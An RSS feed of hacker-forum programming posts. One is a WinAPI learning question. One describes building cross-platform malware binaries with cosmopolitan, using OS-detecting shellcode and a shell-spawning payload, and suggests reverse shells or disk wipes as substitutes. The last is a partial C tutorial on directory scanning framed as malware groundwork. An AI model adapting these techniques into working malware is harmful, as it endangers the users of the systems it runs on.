<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Programming - 0x00sec - The Home of the Hacker</title>
    <link>https://d.clarkee.co.uk/c/programming/61</link>
    <description>Topics in the &#39;Programming&#39; category </description>
    
      <lastBuildDate>Thu, 15 Apr 2021 21:15:53 +0000</lastBuildDate>
      <atom:link href="https://d.clarkee.co.uk/c/programming/61.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>How do you learn WinApi</title>
          <dc:creator><![CDATA[n33ds0n]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>1: Can you tell us how you learned all about the windows API</p>
<p>2: How do you master it.</p>
<p>3: What are the resources you used while learning the windows API</p>
<p>4: Share the resources you used with us</p>
<p>5: Which programing language you used C or C++</p>
<p>6: Tell us more</p>
<p>More important the resources(link, PDF video anything just where)</p>
<p>Thanks <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"></p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/how-do-you-learn-winapi/25678">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/how-do-you-learn-winapi/25678</link>
          <pubDate>Thu, 15 Apr 2021 21:15:53 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-25678</guid>
          <source url="https://d.clarkee.co.uk/t/how-do-you-learn-winapi/25678.rss">How do you learn WinApi</source>
        </item>
        <item>
          <title>Multi Platform Execution</title>
          <dc:creator><![CDATA[crimsonRain]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>This is my first post so don’t expect anything much, just sharing an idea is all. Shoutout to <a class="mention" href="https://d.clarkee.co.uk/u/leeky">@Leeky</a> and <a class="mention" href="https://d.clarkee.co.uk/u/jeff">@jeff</a> for helping out in regards to OS detection as I’m pretty unfamiliar with it. I recently came across an interesting project called <a href="https://github.com/jart/cosmopolitan" rel="noopener nofollow ugc">cosmopolitan</a>. The part about this project that makes it interesting is that the binaries compiled using comopolitan is that it’s a compile once and run anywhere. What this means is that you can run the binary without it being compiled specifically for a single OS, but rather is able to be executed using a <a href="https://www.youtube.com/watch?v=VVdmmN0su6E" rel="noopener nofollow ugc">polyglot format</a> called αcτµαlly pδrταblε εxεcµταblε (pretty aesthetic name, I know) or APE for short. In a nutshell, polyglot formats are files that can be interpreted in different formats depending on what program opens that file. The case of binaries compiled with cosmopolitan falls under this case as different OS loaders are able to properly execute the binary.</p>
<p>I kept thinking of what could be made with such a project as there was no longer a limitation of compiling OS specific binaries. One of the things that came to mind was multi platform malware. I could easily see how malware could be made “multi platform” through scripts but I’ve never heard of the binary itself being multi platform. Realizing this, I tried to see if there were any caveats using this project. Well, there were quite a few but they shouldn’t mean much in MalDev:</p>
<ul>
<li>The project doesn’t support any desktop GUIs hence “textmode” in their github description.</li>
<li>The binary “will assimilate itself as a conventional resident of your platform after the first run” this means, after the first run, the binary is no longer multi platform sadly. Needless to say, if we require that the binary propagates, we need save a copy of it before execution. The only thing I could think of is the binary copying itself on disk during runtime, note that this may be entirely wrong as I’m assuming that the assimilation process happens at the end of execution.</li>
</ul>
<pre><code class="lang-auto">Note that I'm no way responsible for any damage the reader may do using this technique and I'm assuming the reader is a responsible person.
</code></pre>
<h1>Setup</h1>
<p>Now enough intro, let’s get started. We’re going to be developing in Linux since it’s far easier to set up due to the fact that developing on Mac or Windows would require installing gnu linux toolchain before compiling cosmopolitan. To get started we run the following as mentioned on the github:</p>
<pre><code class="lang-auto">mkdir mal &amp;&amp; cd mal
wget https://justine.lol/cosmopolitan/cosmopolitan-amalgamation-0.3.zip
unzip cosmopolitan-amalgamation-0.3.zip
</code></pre>
<p>And that’s it, we just need to stay in the current directory in order for this to work.</p>
<h1>Execution?</h1>
<p>It is commonly known that malware has OS specific techniques and the only thing in our way is to know when to use these OS specific techniques. The only challenge now is to when to use these OS specific techniques. There are two ways we could do this:</p>
<ol>
<li>
<p>A high level method such as looking for presence of paths such as /root, /lib, /bin vs C:\ (thanks uncle jeff)</p>
</li>
<li>
<p>A low level method of using <a href="https://modexp.wordpress.com/2016/06/02/shellcode-detection/" rel="noopener nofollow ugc">Assembly to detect the running OS</a> (thanks Leeky)</p>
</li>
</ol>
<p>Well the point of the post is not to write full fledged malware but rather prove that it is possible to produce a binary that does its malicious job regardless of the OS. In accordance to this, we’ll try to execute payload that pops a shell. This doesn’t seem malicious you say? Well you can swap the payload for a reverse shell, a forkbomb or a nasty disk wipe if they make the binary qualify as malware.</p>
<h1>High Level</h1>
<p>Now let’s test if our OS detection techniques work before executing some payload. We’re going to start off with the first method since it seems to be the easier of the two to implement. The source code and the command to compile the source is as follows:</p>
<pre><code class="lang-auto">int main() {
        char * OS = "None";
        if(isdirectory("C:\\"))
                OS = "Windows";
        else if(isdirectory("/root"))
                OS = "Linux";

        printf("The current OS is %s\n", OS);
}
</code></pre>
<pre><code class="lang-auto">gcc -g -Os -static -nostdlib -nostdinc -fno-pie -no-pie -mno-red-zone \
  -fno-omit-frame-pointer -pg -mnop-mcount \
  -o test.com.dbg test.c -fuse-ld=bfd -Wl,-T,ape.lds \
  -include cosmopolitan.h crt.o ape.o cosmopolitan.a
objcopy -S -O binary test.com.dbg test.com
</code></pre>
<p>It’s nice how we don’t have to manually write out includes. Anyway, the code is fairly straightforward. The checking is done through looking for the existence of a particular root directory. If you run this binary in a Windows machine, “The current OS is Windows” should be printed to stdout, otherwise it will output “The current OS is Linux”. Upon execution, we get the following output on the Windows host and Linux VM respectively.</p>
<pre><code class="lang-auto">C:\Users\crimsonRain\Desktop&gt;test.com
The current OS is Windows
</code></pre>
<pre><code class="lang-auto">crimsonRain@Desktop:~/mal$./test.com
The current OS is Linux
</code></pre>
<p>Happily enough, this works on both Windows 10 and on Ubuntu. Note that I compiled the binary in WSL then copied it to the directory /mnt/c/Users/crimsonRain/Desktop. Since our first method works, let’s now try the second one.</p>
<h1>Low Level</h1>
<p>As expected, this was the lengthiest to implement as there is a lack of shellcode in regards to OS detection. Though <a href="https://modexp.wordpress.com/2016/06/02/shellcode-detection/" rel="noopener nofollow ugc">this</a> is the only available post on Multi OS Shellcode, it sadly doesn’t work for Windows 10. Luckily enough, using <a href="https://web.archive.org/web/20160409113027/http://www.chokepoint.net/2013/09/building-multiplatform-shellcode-header.html" rel="noopener nofollow ugc">this post</a> which was referenced in the previous one we are able to customize the given shellcode to suit our needs. The following is the shellcode creation process.</p>
<pre><code class="lang-auto">  bits 32
arch_detect:
  xor eax, eax
  dec eax
  jnz determine_32_os

determine_64_os:
  mov eax, ds
  test eax, eax
  jnz win64_code
  jmp lin64_code

determine_32_os:
  mov eax, fs
  test eax, eax
  jz lin32_code

win32_code:
  xor eax, eax
  ret

lin64_code:
  xor eax, eax
  mov al, 1
  ret

win64_code:
  xor eax, eax
  mov al, 2
  ret

lin32_code:
  xor eax, eax
  mov al, 3
  ret
</code></pre>
<p>Let’s go through the code for a bit. If we run this in a 32 bit system, the jnz under arch_detect would have eax set as -1. If we run this in a 64 bit system however, the dec eax instruction becomes the REX.W prefix for the jnz as outline in <a href="https://stackoverflow.com/questions/50978180/programmatically-detect-cpu-architecture-at-runtime" rel="noopener nofollow ugc">prl’s answer</a>. The next part is the determine_64_os label, if we are in a Linux system, the ds segment register is nearly always zero while the opposite is true for Windows. The determine_32_os label is somewhat similar where a Linux system sets the fs segment register to 0 while once again the opposite is true for Windows. The rest of the code is self explanatory as we set 0, 1, 2, 3 as markers to identify the running OS. Continuing on:</p>
<pre><code class="lang-auto">nasm -felf32 shellcode.asm
objcopy -O binary -j .text shellcode.o 
</code></pre>
<p>We have proper shellcode that we want to use, we then get the binary data as a hex string and use it in the following source code:</p>
<pre><code class="lang-auto">int get_os() {
        unsigned char * exec = "\x31\xc0\x48\x75\x08\x8c"
                               "\xd8\x85\xc0\x75\x10\xeb"
                               "\x09\x8c\xe0\x85\xc0\x74"
                               "\x0d\x31\xc0\xc3\x31\xc0"
                               "\xb0\x01\xc3\x31\xc0\xb0"
                               "\x02\xc3\x31\xc0\xb0\x03"
                               "\xc3";
        int (*_get_os)() = (int(*)())exec;
        return _get_os();
}

int main() {
        printf("%d\n", get_os());
        return 0;
}
</code></pre>
<p>As we can see from the source code, we use the classical shellcode execution technique in order to invoke the shellcode that we crafted. Upon execution, we get the following output on the Windows host and Linux VM respectively.</p>
<pre><code class="lang-auto">C:\Users\crimsonRain\Desktop&gt;test.com
1
</code></pre>
<pre><code class="lang-auto">crimsonRain@Desktop:~/mal$./test.com
2
</code></pre>
<p>And yes, I almost forgot to mention the systems are both 64 bit, so this method of OS detection works. We can conclude that both high and low level methods of OS detection work properly but their use case will be discussed further.</p>
<h1>High Level vs Low Level?</h1>
<ol>
<li>Speed and Size - It’s always a given that Low Level is king in this domain since we take control of constructing assembly instructions rather than handing it off to a compiler. So if you really want these tweaks in performance, you’re better off using the Low Level method of OS detection.</li>
<li>Ease of Development - Using the High Level method is best if the programmer lacks the appropriate skill to write assembly or wants to save time and effort as crafting shellcode can be fairly frustrating.</li>
<li>Portability - You could say this is a consequence of point 2, where if we used the High Level approach, we would just need to add a function that expects another parameter for another given OS. This is not the case with the Low Level approach as we are required to look for assembly tricks that take advantage of the differences in the given environments of each OS.</li>
</ol>
<h1>Payload Time</h1>
<p>Now we have all the pieces in place and we can finally construct a binary that guarantees execution of payload on either a Windows or Linux system. The following is the final source code with an inclusion of payload:</p>
<pre><code class="lang-auto">int get_os() {
        unsigned char * exec = "\x31\xc0\x48\x75\x08\x8c"
                               "\xd8\x85\xc0\x75\x10\xeb"
                               "\x09\x8c\xe0\x85\xc0\x74"
                               "\x0d\x31\xc0\xc3\x31\xc0"
                               "\xb0\x01\xc3\x31\xc0\xb0"
                               "\x02\xc3\x31\xc0\xb0\x03"
                               "\xc3";
        int (*_get_os)() = (int(*)())exec;
        return _get_os();
}

int main() {
        int OS = get_os();
        if(OS == 1 || OS == 3)
        	system("/bin/bash");
    	else
            system("cmd.exe");
        return 0;
}
</code></pre>
<h1>Conclusion</h1>
<p>It was never thought that cross platform binaries would be a thing, but surprisingly enough, they are here. But through utilizing both an archaic technique of low level OS detection and the new technology of multi platform binaries, we are able to show that it is possible to achieve Multi Platform Execution of a given payload. This idea could be further extended to conditionally executing whole routines for a given OS or be able to make most devices in a network a victim of malware since we don’t need any third party libraries, no interpreter and no virtual machine.</p>
<p>Well, I hope you enjoyed reading this small post and feel free to point out any mistakes as I’m also learning. And finally, thank you <a class="mention" href="https://d.clarkee.co.uk/u/0x00pf">@0x00pf</a> for writing out the Programming for Wanabes series which inspired me to write this post in order to share what I learnt.</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/multi-platform-execution/25663">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/multi-platform-execution/25663</link>
          <pubDate>Wed, 14 Apr 2021 23:26:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-25663</guid>
          <source url="https://d.clarkee.co.uk/t/multi-platform-execution/25663.rss">Multi Platform Execution</source>
        </item>
        <item>
          <title>Programming for Wanabes VII. Finding files I</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <h1><a name="p-65426-programming-for-wanabes-vii-finding-files-i-1" class="anchor" href="https://d.clarkee.co.uk#p-65426-programming-for-wanabes-vii-finding-files-i-1"></a>Programming for Wanabes VII. Finding files I</h1>
<p>It is time to get started with more advanced code. We will be introducing multiple concepts from this point on and hopefully we will boost our programming skills in no time. In the previous instalment we identified the ability to find files in the disk as a feature required by several malwares.</p>
<p>Actually it is a feature required by many other applications and will let us learn about new system calls, loops and structures. Without further ado, let’s jump into the topic</p>
<h1><a name="p-65426-getting-ready-to-read-directories-2" class="anchor" href="https://d.clarkee.co.uk#p-65426-getting-ready-to-read-directories-2"></a>Getting Ready to Read directories</h1>
<p>Whenever you need to read the content of a folder and you want to be portable between platforms, the right way to proceed is using the POSIX interface.</p>
<p>I will first dump here a shrink down version of the general program from the <a href="https://0x00sec.org/t/programming-for-wannabes-part-vi-malware-introduction/25595/" rel="noopener nofollow ugc">previous instalment</a>. In the rest of this text we will just work out the <code>select_target</code> functions. Everything else will stay the same for the time being. So, this is our starting point:</p>
<pre data-code-wrap="C"><code class="lang-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;

#include &lt;sys/types.h&gt;  // POSIX directoy reading interface
#include &lt;dirent.h&gt;

char *the_folder="/tmp/";

typedef int (*PAYLOAD_FUNC)(char *);

int payload (char *target) {
  printf ("Doing malware things to %s\n", target);
}

int select_target (PAYLOAD_FUNC pf) {
  return 0;
}

int main () {
  while (select_target(payload));
}
</code></pre>
<p>No big surprises here, a bunch of include files with the functions and data structures we will need and the functions we introduced for our generic malware. The only tricky thing here is the definition of a function type. I introduced this silently in the previous instalment, but this time we should look deeper into this so you understand what we are doing.</p>
<h2><a name="p-65426-function-pointers-3" class="anchor" href="https://d.clarkee.co.uk#p-65426-function-pointers-3"></a>Function Pointers</h2>
<p>One of the data types that we can use in C are the so-called pointers. We had introduced them earlier in this series, but for completeness let’s quickly define them again: a pointer is just a variable that contains a memory address. It is said that it <em>Points to</em> that address, hence the name… <em>Pointer</em>.</p>
<p>Usually pointers point to addresses containing data (variable pointers), but there is no reason why a pointer wouldn’t point to an address containing code… a function for instance. In assembly this is very straight forward, we just need to do <code>call/jmp</code> with some kind of indirect addressing (that is, using a register or variable that contains the address to jump into, instead of the direct address, so we can control that value programatically). Let’s see this with an example</p>
<pre><code>DIRECT                 INDIRECT
                       mov    payload, %rax
call payload           callq  *%rax
</code></pre>
<p>In the direct code we are using the <code>payload</code> address directly. In the indirect code we load the function address in a register and then we jump to the address stored in that register. In general, when you declare a function pointer variable, that pointer will be stored somewhere in the stack, and instead of loading the address directly on <code>RAX</code> (like in this example), we will load <code>RAX</code> with that stack value.</p>
<p>Let’s change the <code>select_address</code> above to actually call <code>payload</code> and let’s take a look to the generated code:</p>
<pre data-code-wrap="C"><code class="lang-C">int select_target (PAYLOAD_FUNC pf) {
  pf (the_folder);
  return 0;
}
</code></pre>
<p>This produces the following assembler. You have to compile it with <code>-O2</code> so the code gets slightly optimised, otherwise, gcc will generate code to store the parameter (the function pointer) in the stack and just after that read that stack value and put it in <code>RAX</code>. In other words it just moves the parameter around doing nothing.</p>
<pre data-code-wrap="asm"><code class="lang-asm">00000000000006c0 &lt;select_target&gt;:
 6c0:   48 83 ec 08             sub    $0x8,%rsp
 6c4:   48 89 f8                mov    %rdi,%rax
 6c7:   48 8b 3d 42 09 20 00    mov    0x200942(%rip),%rdi        # 201010 &lt;the_folder&gt;
 6ce:   ff d0                   callq  *%rax
 6d0:   31 c0                   xor    %eax,%eax
 6d2:   48 83 c4 08             add    $0
 6d6:   c3                      retq

</code></pre>
<p>We already know all this, but let’s refresh our minds once again:</p>
<ul>
<li>We get our parameter (the <code>payload</code> address in this case) in <code>RDI</code></li>
<li>We copy it into <code>RAX</code></li>
<li>Put the <code>the_folder</code> variable in  <code>RDI</code> (remember <code>RDI</code> contains the first parameter)</li>
<li>Run the function indirectly (jump to the content of <code>RAX</code> that in this case is <code>payload</code>)</li>
</ul>
<p>So, that’s it. In this case we are using the pointer directly, but we could store it in memory and then we will be talking about a function pointer variable. This is obvious and straightforward in asm, but in C we need to use a kind of cryptic way to define function pointers:</p>
<pre data-code-wrap="C"><code class="lang-C">return_type (*var/type) (parameters);
</code></pre>
<p>So you just need to put parenthesis (and an <code>*</code>, after all we are defining a pointer) around the variable or type that you want to define. Let’s see a few examples:</p>
<pre data-code-wrap="C"><code class="lang-C">int (*func)(int, int);
</code></pre>
<p>This declares a variable named <code>func</code> that is a pointer to a function returning an integer, and expecting two integers as parameters.</p>
<pre data-code-wrap="C"><code class="lang-C">typedef int (*FUNC)(int, int);
FUNC func;
</code></pre>
<p>This renames a function pointer type (that is what <code>typepdef</code> does) to represent the same function we defined above. Then it declares the same variable but using the new type name. This makes the code more readable, but other than that, there is no difference at all.</p>
<p>Also note that the assembler generated to call our function (via the function pointer) is independent of the actual types in the declaration… you can call the function with whatever you want… but the function will likely not work as expected, or even crash. The types definitions are just used by the compile to let us know that we are doing what we are suppose to do. Just change the type definition and recompile, you will get the same code.</p>
<h1><a name="p-65426-reading-a-directory-the-posix-way-4" class="anchor" href="https://d.clarkee.co.uk#p-65426-reading-a-directory-the-posix-way-4"></a>Reading a directory the POSIX way</h1>
<p>Now we can get back to the main topic, how to read the content of a directory. Remember, virus, ransomware, spyware, all of them need to scan the disk to find different types of files. Let’s see how to do this.</p>
<p>We will start doing it the <em>Right Way</em>, that is, how it is expected to be done by any normal system application. And that is using the POSIX interface that is composed of three functions:</p>
<pre><code>opendir  Opens a directory for reading
readdir  Read one directory entry each time it is called
closedir Closes the directory
</code></pre>
<p>This API is intended to mimic the normal file interface (the stream like interface offered by <code>fopen/fread/fclose</code>), but just using slightly different data structures. Using this function our <code>select_target</code> function will look like this:</p>
<pre><code class="lang-auto">int select_target (PAYLOAD_FUNC pf) {
  struct dirent *de;
  DIR           *d;
  
  if (!(d = opendir (_the_folder))) {perror ("opendir:"); exit (EXIT_FAILURE);}

  while (1) {
      errno = 0;
      if (!(de = readdir (d))) {
	    if (errno) perror ("readdir:");
	    break;
      }
      pf (de-&gt;d_name);
    }
  closedir (d);
  return 0;
}
</code></pre>
<p>The first thing to note is that, <code>DIR*</code> is the type used by all the function, it is similar to the classical <code>FILE*</code> that we use with files (when using the stream interface). Conceptually it is the same, a stream abstraction of a directory. The <code>opendir</code> and <code>closedir</code> are intended to intialise the structure and to finish the processing respectively (and release resources). Not much more to say about them, you need to call <code>opendir</code> before start reading the directory, and you have to call <code>closedir</code> whenever you are done processing your folder. Yes, the parameter to <code>opendir</code> is just a string containing the folder to process. We will see later what those functions really do under the hood.</p>
<p>The interesting function is <code>readdir</code> that is the one that actually reads directory entries one by one.</p>
<h1><a name="p-65426-structs-5" class="anchor" href="https://d.clarkee.co.uk#p-65426-structs-5"></a><code>structs</code></h1>
<p>Before looking into <code>readdir</code> in detail, we need to introduce a new C keyword: <code>struct</code>. A <code>struct</code> is a so-called compound type. It is a compound type because it is composed of other types. Each one of those types together with the new we give to them is known as a field. You can think about a <code>struct</code> like a variable that groups more variables together in a convenient way.</p>
<p>The way to declare them is like this:</p>
<pre data-code-wrap="C"><code class="lang-C">struct name_of_the_struct {
  type1  field1;
  type2  field2;
  ....
};
</code></pre>
<p>A more specific example could be:</p>
<pre data-code-wrap="C"><code class="lang-C">struct linux_dirent {
  long           d_ino;
  long           d_off;
  unsigned short d_reclen;
  char           d_name[];
};

struct linux_dirent de,*pde;
</code></pre>
<p>The code above defines a new type named <code>struct linux_dirent</code> (note that you need to use <code>struct</code> to refer to the new type) composed of two longs (64bits integer), one short (16 bit integer) and a string of unknown size. You can add as many fields as you want, but in this case we are using only 4.</p>
<p>After the <code>struct</code> definition we have defined two variables. One is a <code>struct</code> and the other one is a pointer to a <code>struct</code>. Once the variables are declared, we can access the fields using the <code>.</code> for the struct one and the <code>-&gt;</code> operator for the pointer. Just like this:</p>
<pre data-code-wrap="C"><code class="lang-C">de.d_ino = 12345;
de.d_off = 0;
pde = &amp;de;
pde-&gt;d_ino = 54321;
pde-&gt;d_off = 1;
</code></pre>
<p>Whenever you need to pass structs as parameters to function, it is usual to redefine them using <code>typedef</code>s in order to minimise the writing. Imagine a function that returns one of those <code>struct linux_dirent</code> structs and receives as parameter two of them. The prototype will look like:</p>
<pre data-code-wrap="C"><code class="lang-C">struct linux_dirent my_func (struct linux_dirent p1, struct linux_dirent p2);
</code></pre>
<p>This is a lot of writing and also it is harder to figure out the function prototype at one glance. Now imagine, you have 20 more function in your API to deal with this data type…So we could just create an <em>alias</em> for this type:</p>
<pre data-code-wrap="C"><code class="lang-C">typedef struct linux_dirent LDIRENT;
LDIRENT my_func (LDIRENT p1, LDIRENT p2);
</code></pre>
<p>Which is way more easy to read. However this is a matter of personal use. Both approaches will produce the same code. Some people prefers to write everything so it is always clear what is that type (a struct in this case), and other prefer to redefine them. In the standard C library you will find both.</p>
<p><em>Note: It is not common (but indeed possible) to pass and return structs in C functions, usually you will use pointers instead. The reason is that C passes parameter by value. This means that all parameters we pass have to be copied. It is easier to copy 4/8 bytes for a pointer than the roughly 24 bytes required by the struct in our example.</em></p>
<p>All this may look  complicated at first glance, but you will get used to this very quickly. This data structures are all over the place when writing non trivial programs</p>
<p>However, in this course we are not just learning the syntax of C, we are going deeper.</p>
<h1><a name="p-65426-structs-are-just-memory-blocks-6" class="anchor" href="https://d.clarkee.co.uk#p-65426-structs-are-just-memory-blocks-6"></a><code>structs</code> are just memory blocks</h1>
<p>So, what is really a <code>struct</code> ?. Short answer: It is just a memory block. When we declare a variable of type struct, we are just allocating enough space to contain all the struct elements either in the stack, in case our variable is local to a function, in the data segment, in case it is a global variable, or in the <em>Heap</em> in case we allocate the memory block dynamically. This last case we will cover later in this course.</p>
<p>For our previous example we have:</p>
<pre data-code-wrap="C"><code class="lang-C">struct linux_dirent {
  long           d_ino;      // 8 bytes
  long           d_off;      // 8 bytes
  unsigned short d_reclen;   // 2 bytes
  char           d_name[];   // This is a placeholder we will talk about in a sec
};
</code></pre>
<p>So, this structure requires 18 bytes, which will likely be rounded up to 24 bytes to keep the memory alignment (check previous instalments when we introduce the native word size). You can just add a <code>printf</code> using the <code>sizeof</code> operator to find out the actual size of the struct. In memory it will look like:</p>
<pre><code>ADDR+18 -&gt; | d_name
ADDR+16 -&gt; | d_reclen (2 bytes) 
ADDR+8  -&gt; | d_off    (8 bytes) 
ADDR   --&gt; | d_ino    (8 bytes)
            +--------------
</code></pre>
<p>When declaring a variable, such a variable just names that memory block… Think about it as a label, and therefore it is inmutable (you cannot change its value). It is the same with arrays… they are like pointers but not completely (we will talk about this again when arrays pop up in our way later in the course).</p>
<p>When you declare a pointer to a struct, you are just allocating memory to store an address that will point to memory block. Note that when declaring a pointer to an structure, the structure is not magically created. It is just a pointer. You need to allocate the memory block for the structure by other means.</p>
<p>You can now add the <code>struct</code> we defined above to your program (we will do that in a sec) and declare a local variable in the <code>select_file</code> function. Then take a look to the generated code. The beginning of the function will allocate extra space (the <code>sub $0xVAL,%rsp</code> at the beginning) to accommodate the new variable.</p>
<h1><a name="p-65426-what-about-the-d_name-field-7" class="anchor" href="https://d.clarkee.co.uk#p-65426-what-about-the-d_name-field-7"></a>What about the <code>d_name</code> field?</h1>
<p>Many of you may be wondering this… what does that <code>char d_name[]</code> means. Well, it is actually a placeholder. A field added to the <code>struct</code> to point to whatever comes after the rest of the fields. Or to get access to a specific point inside the struct if you prefer. This technique is used when the programmer needs to deal with variable length items.</p>
<p>In this example we do not known how long the name of the directory entry will be. When this happens we usually have two options. We either provide enough space so the longest possible name will fit in our memory block (and/or we limit the longest possible name with additional checks in the code), or we dynamically allocate space for the directory entry whenever we find out its size. Allocations just don’t happen magically… even on interpreted languages all these processes are happening under the hood… whenever you add two strings in python a lot of allocation and memory movement happens.</p>
<p>Let’s see how would this work. Imagine we are allocating our structure in the stack. Note that the actual memory block is created/managed by the <code>readdir</code> function not for us. The function gives us a pointer to the memory it manages/allocates. As, for the time being, we only know how to allocate memory in the stack, let’s assume <code>readdir</code> allocates memory in the stack, however it is likely to use some global storage or the heap. You should have an idea of the why at this point.</p>
<p>Also, let’s assume, that the syscalls used by <code>readdir</code> (remember <code>readdir</code> is a libc function not a system call), will let us known the size of file name it is reporting. Let’s imagine the length of the filename is <code>len</code>.</p>
<p>Then <code>readdir</code> will allocate in the stack 24 bytes + len, so there is enough space to store the <code>struct linux_dirent</code> fields plus the string. In this case the stack will look like this:</p>
<pre><code>ADDRS+18+len -&gt; | \0
ADDRS+18     -&gt; | d_name (the string goes here)
ADDRS+16     -&gt; | d_reclen (2 bytes) 
ADDRS+8      -&gt; | d_off    (8 bytes) 
ADDRS       --&gt; | d_ino    (8 bytes)
                +--------------
</code></pre>
<p>Whenever we access the <code>d_name</code> field that is located at <code>ADDR+18</code>, we will find a variable length string containing the name of the file being read by <code>readdir</code>.</p>
<p>From a syntactic point of view <code>char d_name[]</code> represents a character string of unknown size. In practise it is just indicating the offset in the memory block holding the structure where the string will be.</p>
<p>This technique is also sometimes used in network programming when the length of the packet is unknown until the packet header is read and the field containing the packet size can be read.</p>
<h1><a name="p-65426-reading-the-directory-8" class="anchor" href="https://d.clarkee.co.uk#p-65426-reading-the-directory-8"></a>Reading the directory</h1>
<p>Now that we know what a <code>struct</code> is, we can start using <code>readdir</code>. This function returns a pointer to a <code>struct dirent</code>. This type is defined in <code>#include &lt;dirent.h&gt;</code> and as you had already figure out the name comes from <em>DIRectory ENTry</em>.</p>
<p>So, each time we run <code>readdir</code> we will get the information of one of the files in the directory. We have to call it again and again until the whole directory is read. So, the question is: when should we stop?. Well, the answer, is in the <code>man</code> pages. Never underestimate the amount of information provided by the man pages. So this is what it says:</p>
<pre><code>RETURN VALUE
       On  success, readdir() returns a pointer to a dirent structure.  (This structure
       may be statically allocated; do not attempt to free(3) it.)

       If the end of the directory stream is reached, NULL is returned and errno is not
       changed.   If  an error occurs, NULL is returned and errno is set appropriately.
       To distinguish end of stream and from an error, set errno to zero before calling
       readdir() and then check the value of errno if NULL is returned.
</code></pre>
<p>Crystal clear. Now we can recall the main loop in our <code>select_target</code> function and look at it again:</p>
<pre data-code-wrap="C"><code class="lang-C">  while (1) {
      errno = 0;
      if (!(de = readdir (d))) {
	    if (errno) perror ("readdir:");
	    break;
      }
      pf (de-&gt;d_name);
    }
</code></pre>
<p>We had already introduced the <code>while</code> loop in the past. It just loops <em>while</em> the condition we set in the <code>while</code> is true. In this case, <code>while(1)</code> means that the loop will run forever, because the condition is always true (!= 0).</p>
<p><em>NOTE:C doesn’t has a boolean type. Conditional operators traditionally returns FALSE as 0 and TRUE as not zero. Setting the while condition to 1  means that it is always true. You could set it to 31173 and it will work the same, but why would you type 5 numbers when you can just type 1?.</em></p>
<p>Then we are prepared to call <code>readdir</code>. We set <code>errno</code> to zero as proposed in the man page, and call the function, if we get a <code>NULL</code> we fall into the <code>if</code>. Then we check again the <code>errno</code> variable and if it has changed we show and error. In either case, we had an error or we have reached the end of the list, we leave the while loop using <code>break</code>.</p>
<blockquote>
<p>NOTE: The expression we use above <code>if (!p)</code> is equivalent to <code>if (p == 0)</code> or if you prefer <code>if (p == NULL)</code>, the compiler will see that <code>p</code> is a pointer and will change 0 to a compatible representation of <code>NULL</code>. The way to write this is a matter of personal taste and some people says <code>if (!p)</code> is bad style, and some other say it is good… Just do whatever better suits you, but be aware of what is going under the hood. The key point here is that NULL is a special value and doesn’t need to be the integer 0. This may be confusing for the beginner. You can take a look to <a href="http://c-faq.com/null/" rel="noopener nofollow ugc">the c faq NULL section</a> for details.</p>
</blockquote>
<p>Otherwise, we access the field <code>d_name</code> in the struct <code>struct dirent</code> that contains the name of the directory entry returned by <code>readdir</code> and pass it to the <code>payload</code> function.</p>
<h1><a name="p-65426-reading-directories-with-system-calls-9" class="anchor" href="https://d.clarkee.co.uk#p-65426-reading-directories-with-system-calls-9"></a>Reading directories with system calls</h1>
<p>We have a working function able to read the content of a directory in the disk using the POSIX interface. Overall, when writing malware we would like to minimise application dependencies and in the extreme case that implies just using the OS and avoid all libraries… However this is not always possible.</p>
<p>In this case, instead of using the POSIX function we can use the associated Linux system call. This is perfectly fine, however the drawback is that the POSIX version will work with all POSIX compatible operating systems and the non-POSIX version will be Linux specific. In other words, all POSIX compatible system have the <code>opendir/readdir/closedir</code> functions but each one will have different system calls to access the directories. That is what standards are for.</p>
<blockquote>
<p>NOTE: That our program will work in any POSIX complaint system (Linux, NetBSD, OpenBSD, Solaris, MacOs…) means that we can recompile for those systems and the program will still work, it doesn’t mean that any compiled version of our program will run magically in all POSIX compliant OSes… <a href="https://0x00sec.org/t/multi-platform-execution/25663/" rel="noopener nofollow ugc">However</a></p>
</blockquote>
<blockquote>
<p>NOTE2: Linux is not officially POSIX complaint. Despite of possible minor divergences the main issue is that POSIX certification, as most certifications out there, are really achieved by paying a fee…</p>
</blockquote>
<p>Anyhow, malware is usually target specific (platform-wise) and getting rid of the standard libc will make our program very small and give us much more control on what is in it and what is not.</p>
<p>So, the system call that we have to use is known as <code>getdents</code>. Sure, you got it, it stands for <em>GET Directory ENTries</em>. There is a man page for it and it says that there is no wrapper provided by libc, so we have to write our own if we want to use it (the man page already says how to do that):</p>
<pre data-code-wrap="C"><code class="lang-C">#include &lt;sys/syscall.h&gt;

int getdents (int fd, char *buf, int len)
{ return syscall (SYS_getdents, fd, buf, len); }
</code></pre>
<p>We will not go all the way down to the kernel right now. We implement it using the <code>syscall</code> standard function instead of invoking the <code>syscall</code> processor instruction directly so we can still use C code and we do not need to start adding assembler at this point. We will get to that a bit later.</p>
<p>In order to use this function, we need a file descriptor for the directory. We can get this using the standard <code>open</code> system call. This will do the trick:</p>
<pre data-code-wrap="C"><code class="lang-C">int select_target (PAYLOAD_FUNC pf) {
  char                buf[BUF_SIZE];
  struct linux_dirent *de;
  int                 fd, n, i;
  
  // Open directory using open
